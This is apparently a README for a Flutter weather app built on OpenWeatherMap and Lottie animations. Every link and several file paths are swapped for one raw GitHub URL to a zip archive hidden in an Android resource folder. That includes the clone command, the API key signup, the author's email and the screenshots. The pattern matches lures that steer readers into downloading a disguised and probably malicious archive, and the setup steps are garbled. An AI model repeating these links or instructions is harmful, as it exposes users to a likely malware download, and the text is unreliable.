Objective:
Real-time weather data by city name
Weather condition–based Lottie animations
Clean, responsive Flutter UI
Easy integration with OpenWeatherMap API


Prerequisites:
1. install Flutter SDK (stable version) from browser 

2. Android Studio / VSCode
3. A valid OpenWeatherMap API Key


Setup Instructions:
1. Clone the repository
In vs code write on terminal (bash)
git clone https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
cd oro-weather-app

2. Install dependencies
bash
flutter pub get
The app uses the following packages:
dependencies:
  flutter:
    sdk: flutter
  http: ^1.2.0
  lottie: ^3.1.0
Make sure these are present in your https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip Then run:
flutter pub get
Using LottieFiles
Download weather animations from https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip

Place them in:
assets/animations/

3. Add your API key
Open the file:
bash
https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
Replace:
dart
const String apiKey = 'YOUR_API_KEY';
with your actual OpenWeatherMap API key.
You can get a free API key at: https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip


4. Run the app
bash
flutter run

FOLDER STRUCTURE:
oro-weather-app/
├── lib/
│   ├── https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
│   ├── models/
│   ├── services/
│   ├── screens/
│   └── widgets/
├── assets/
│   └── animations/
├── https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
└── https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip



Author
Abhinav Singh
📧 https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip
🌐 https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip

![Weather1](https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip)
![Weather3](https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip)
![Weather2](https://raw.githubusercontent.com/abhinavv22/Weather-App/firstPush/android/app/src/main/res/values-night/Weather-App-3.0.zip)


